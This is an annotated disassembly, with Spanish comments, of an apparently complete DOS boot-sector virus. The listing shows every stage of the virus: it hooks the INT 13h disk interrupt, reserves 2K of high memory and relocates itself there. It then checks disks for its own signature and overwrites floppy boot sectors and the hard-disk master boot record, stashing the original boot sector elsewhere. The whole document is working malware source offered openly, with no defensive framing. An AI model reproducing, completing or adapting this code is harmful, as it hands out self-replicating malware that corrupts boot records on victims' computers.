0000  EA 07C0:0005         ;*              jmp     far ptr loc_0001                        ;*(07C0:0005)
0000  EA 05 00 C0 07                       db      0EAh, 5, 0, 0C0h, 7

0005                      loc_0001:

0005  EB 32                                jmp     short loc_0004                          ; (0039)

; ;;;;;;;;;;;;;;;;;;; puntero a int 13h normal

0007  EC59 F000            data_0008       dd      0F000EC59h


; ;;;;;;;;;;;;;;;;;;; puntero al bootstrap normal

000B  7C00 0000            data_0009       dd      07C00h


; ;;;;;;;;;;;;;;;;;;; Flag de infecci;n de r;gido?

000F  00                   data_0010       db      0


; ;;;;;;;;;;;;;;;;;;; pointer a donde reubica el virus

0010  007C 9F80            data_0011       dd      9F80007Ch

; ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;              int 13h entry point!!!!!!!!
; ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

0014  50                                   push    ax
0015  1E                                   push    ds
0016  80 FC 04                             cmp     ah,4
0019  73 17                                jae     loc_0003                                ; Jump if above or =
001B  80 FC 02                             cmp     ah,2
001E  72 12                                jb      loc_0003                                ; Jump if below
0020  0A D2                                or      dl,dl                                   ; Zero ?
0022  75 0E                                jnz     loc_0003                                ; Jump if not zero
0024  33 C0                                xor     ax,ax                                   ; Zero register
0026  8E D8                                mov     ds,ax
0028  A0 043F                              mov     al,byte ptr ds:[43Fh]                   ; (0000:043F=80h)
002B  A8 01                                test    al,1
002D  75 03                                jnz     loc_0003                                ; Jump if not zero
002F  E8 0100                              call    sub_0001                                ; (0132)

; ;;;;;;;;;;;;;;;;   vuelta a la int normal, y posterior retorno.


0032                       loc_0003:
0032  1F                                   pop     ds
0033  58                                   pop     ax
0034  2E:FF 2E 0007                        jmp     dword ptr cs:[7]                        ; (7507:0007=0EC59h)


; ;;;;;;;;;;;;;;;;;;;;;; Int 13h fin


; ;;;;;;;;;;;;;;;;;;;;;; Punto de entrada del Boot vir;sico


0039                       loc_0004:
0039  FA                                   cli                                             ; Disable interrupts
003A  33 C0                                xor     ax,ax                                   ; Zero register
003C  8E D0                                mov     ss,ax
003E  BC 7C00                              mov     sp,7C00h
0041  8E D8                                mov     ds,ax
0043  FB                                   sti                                             ; Enable interrupts

;      ;;;;;;;;;;;;;;;;;    guardar int 13h

0044  A1 004E                              mov     ax,word ptr ds:[4Eh]                    ; (0000:004E=0B708h)
0047  A3 7C09                              mov     word ptr ds:[7C09h],ax                  ; (0000:7C09=0BA16h)
004A  A1 004C                              mov     ax,word ptr ds:[4Ch]                    ; (0000:004C=52h)
004D  A3 7C07                              mov     word ptr ds:[7C07h],ax                  ; (0000:7C07=8BC0h)
0050  A1 0413                              mov     ax,word ptr ds:[413h]                   ; (0000:0413=27Fh)


;      ;;;;;;;;;;;;;;;;;    baja cant. de memoria disponible en 2k

0053  48                                   dec     ax
0054  48                                   dec     ax
0055  A3 0413                              mov     word ptr ds:[413h],ax                   ; (0000:0413=27Fh)

;      ;;;;;;;;;;;;;;;;;    Ubica el segmento donde se va a copiar y lo guarda

0058  B1 06                                mov     cl,6
005A  D3 E0                                shl     ax,cl                                   ; Shift w/zeros fill
005C  A3 7C12                              mov     word ptr ds:[7C12h],ax                  ; (0000:7C12=7211h)


;      ;;;;;;;;;;;;;;;;;    define nueva int 13h

005F  8E C0                                mov     es,ax
0061  B8 0014                              mov     ax,14h
0064  8C 06 004E                           mov     word ptr ds:[4Eh],es                    ; (0000:004E=0B708h)
0068  A3 004C                              mov     word ptr ds:[4Ch],ax                    ; (0000:004C=52h)


006B  0E                                   push    cs
006C  1F                                   pop     ds
006D  FC                                   cld                                             ; Clear direction
006E  33 F6                                xor     si,si                                   ; Zero register
0070  8B FE                                mov     di,si
0072  B9 0198                              mov     cx,198h ; 198h es el largo del virus
0075  F3/A4                                rep     movsb                                   ; Rep while cx>0 Mov [si] to es:[di]

;      ;;;;;;;;;;;;;;;;;   Salta a donde copi; el virus en memoria alta

0077  2E:FF 2E 0010                        jmp     dword ptr cs:[10h]                      ; (7507:0010=7Ch)


;      ;;;;;;;;;;;;;;;;;   Lugar a donde salta el virus despues de copiado

007C  33 C0                                xor     ax,ax      ; Zero register
007E  8B F0                                mov     si,ax
0080  CD 13                                int     13h        ; Disk  dl=drive a: ah=func 00h
                                                              ;  reset disk, al=return status
0082  8E C6                                mov     es,si
0084  BB 7C00                              mov     bx,7C00h
0087  B8 0201                              mov     ax,201h
008A  2E:80 3E 000F 00                     cmp     byte ptr cs:[0Fh],0                     ; (7507:000F=0)
0090  74 2B                                je      loc_0005                                ; Jump if equal
0092  B9 0011                              mov     cx,11h
0095  BA 0080                              mov     dx,80h
0098  CD 13                                int     13h                                     ; Disk  dl=drive a: ah=func 02h
                                                                                           ;  read sectors to memory es:bx
009A  0E                                   push    cs
009B  07                                   pop     es
009C  BB 0200                              mov     bx,200h
009F  B9 0001                              mov     cx,1
00A2  B8 0201                              mov     ax,201h
00A5  CD 13                                int     13h                                     ; Disk  dl=drive a: ah=func 02h
                                                                                           ;  read sectors to memory es:bx
00A7  26:80 06 020F 01                     add     byte ptr es:[20Fh],1                    ; (7507:020F=0)
00AD  B8 0301                              mov     ax,301h
00B0  CD 13                                int     13h                                     ; Disk  dl=drive a: ah=func 03h
                                                                                           ;  write sectors from mem es:bx
00B2  33 C9                                xor     cx,cx                                   ; Zero register
00B4  26:8A 0E 020F                        mov     cl,byte ptr es:[20Fh]                   ; (7507:020F=0)
00B9  8E C6                                mov     es,si
00BB  EB 2E                                jmp     short locloop_0006                      ; (00EB)
00BD                       loc_0005:
00BD  B9 0003                              mov     cx,3
00C0  BA 0100                              mov     dx,100h
00C3  CD 13                                int     13h                                     ; Disk  dl=drive a: ah=func 03h
                                                                                           ;  write sectors from mem es:bx
00C5  72 30                                jc      loc_0007                                ; Jump if carry Set
00C7  0E                                   push    cs
00C8  07                                   pop     es
00C9  BB 0200                              mov     bx,200h
00CC  B8 0201                              mov     ax,201h
00CF  B1 01                                mov     cl,1
00D1  BA 0080                              mov     dx,80h
00D4  CD 13                                int     13h                                     ; Disk  dl=drive a: ah=func 02h
                                                                                           ;  read sectors to memory es:bx
00D6  72 1F                                jc      loc_0007                                ; Jump if carry Set
00D8  0E                                   push    cs
00D9  1F                                   pop     ds
00DA  BF 0000                              mov     di,0
00DD  BE 0200                              mov     si,200h
00E0  AD                                   lodsw                                           ; String [si] to ax
00E1  3B 05                                cmp     ax,[di]
00E3  75 1D                                jne     loc_0008                                ; Jump if not equal
00E5  AD                                   lodsw                                           ; String [si] to ax
00E6  3B 45 02                             cmp     ax,[di+2]
00E9  75 17                                jne     loc_0008                                ; Jump if not equal

00EB                       locloop_0006:
00EB  26:FF 0E 0413                        dec     word ptr es:[413h]                      ; (7507:0413=0)
00F0  26:FF 0E 0413                        dec     word ptr es:[413h]                      ; (7507:0413=0)
00F5  E2 F4                                loop    locloop_0006                            ; Loop if cx > 0


; ;;;;;;;;;;;;;;;;;;;;; Salta al bootstrap normal

00F7                       loc_0007:
00F7  2E:C6 06 000F 00                     mov     byte ptr cs:[0Fh],0                     ; (7507:000F=0)
00FD  2E:FF 2E 000B                        jmp     dword ptr cs:[0Bh]                      ; (7507:000B=7C00h)



0102                       loc_0008:
0102  2E:C6 06 000F 01                     mov     byte ptr cs:[0Fh],1                     ; (7507:000F=0)
0108  B8 0301                              mov     ax,301h
010B  BB 0200                              mov     bx,200h
010E  B9 0011                              mov     cx,11h
0111  BA 0080                              mov     dx,80h
0114  CD 13                                int     13h                                     ; Disk  dl=drive a: ah=func 03h
                                                                                           ;  write sectors from mem es:bx
0116  72 DF                                jc      loc_0007                                ; Jump if carry Set
0118  0E                                   push    cs
0119  0E                                   push    cs
011A  1F                                   pop     ds
011B  07                                   pop     es
011C  BE 03BE                              mov     si,3BEh
011F  BF 01BE                              mov     di,1BEh
0122  B9 0042                              mov     cx,42h
0125  F3/A4                                rep     movsb                                   ; Rep while cx>0 Mov [si] to es:[di]
0127  B8 0301                              mov     ax,301h
012A  33 DB                                xor     bx,bx                                   ; Zero register
012C  FE C1                                inc     cl
012E  CD 13                                int     13h                                     ; Disk  dl=drive a: ah=func 03h
                                                                                           ;  write sectors from mem es:bx
0130  EB C5                                jmp     short loc_0007                          ; (00F7)

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                  Subrutina principal del int 13h del virus
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

                           sub_0001        proc    near
0132  53                                   push    bx
0133  51                                   push    cx
0134  52                                   push    dx
0135  06                                   push    es
0136  56                                   push    si
0137  57                                   push    di

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;; va a hacer 4 intentos de lectura
;                                si falla vuelve.

0138  BE 0004                              mov     si,4
013B                       loc_0009:

; ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;; Lee el boot del disco en 200h

013B  0E                                   push    cs
013C  07                                   pop     es
013D  B8 0201                              mov     ax,201h
0140  BB 0200                              mov     bx,200h
0143  33 C9                                xor     cx,cx                                   ; Zero register
0145  8B D1                                mov     dx,cx
0147  41                                   inc     cx
0148  9C                                   pushf                                           ; Push flags
0149  2E:FF 1E 0007                        call    dword ptr cs:[7]                        ; (7507:0007=0EC59h)
014E  73 0D                                jnc     loc_0010                                ; Jump if carry=0

; ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;; Reset del disco

0150  33 C0                                xor     ax,ax                                   ; Zero register
0152  9C                                   pushf                                           ; Push flags
0153  2E:FF 1E 0007                        call    dword ptr cs:[7]                        ; (7507:0007=0EC59h)
0158  4E                                   dec     si
0159  75 E0                                jnz     loc_0009                                ; Jump if not zero
015B  EB 34                                jmp     short loc_0012                          ; (0191)

; ;;;;;;;;;;;;;;;;;; Rutina que verifica infecciones anteriores
;             Compara los dos primeros word del boot con los del virus
;                         esos word son: EA 05 00 C0
;                           Si est; infectado se va.


015D                       loc_0010:
015D  FC                                   cld                                             ; Clear direction
015E  BF 0200                              mov     di,200h
0161  33 F6                                xor     si,si                                   ; Zero register
0163  0E                                   push    cs
0164  1F                                   pop     ds
0165  AD                                   lodsw                                           ; String [si] to ax
0166  3B 05                                cmp     ax,[di]
0168  75 06                                jne     loc_0011                                ; Jump if not equal
016A  AD                                   lodsw                                           ; String [si] to ax
016B  3B 45 02                             cmp     ax,[di+2]
016E  74 21                                je      loc_0012                                ; Jump if equal


; ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;; Rutina de infecci;n.

; ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;; Copia el boot sector a sector 11
;                                (cylinder 0 side 1 sector 3)


0170                       loc_0011:
0170  B8 0301                              mov     ax,301h
0173  BB 0200                              mov     bx,200h
0176  B1 03                                mov     cl,3
0178  B6 01                                mov     dh,1
017A  9C                                   pushf                                           ; Push flags
017B  2E:FF 1E 0007                        call    dword ptr cs:[7]                        ; (7507:0007=0EC59h)

; ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;; Y se copia a si mismo en el boot.


0180  72 0F                                jc      loc_0012                                ; Jump if carry Set
0182  B8 0301                              mov     ax,301h
0185  33 DB                                xor     bx,bx                                   ; Zero register
0187  B1 01                                mov     cl,1
0189  33 D2                                xor     dx,dx                                   ; Zero register
018B  9C                                   pushf                                           ; Push flags
018C  2E:FF 1E 0007                        call    dword ptr cs:[7]                        ; (7507:0007=0EC59h)

; ;;;;;;;;;;;;;;;;;;;;;;;;;;;; Fin de la rutina


0191                       loc_0012:
0191  5F                                   pop     di
0192  5E                                   pop     si
0193  07                                   pop     es
0194  5A                                   pop     dx
0195  59                                   pop     cx
0196  5B                                   pop     bx
0197  C3                                   retn
                           sub_0001        endp

0198  0068[00]                             db      104 dup (0)

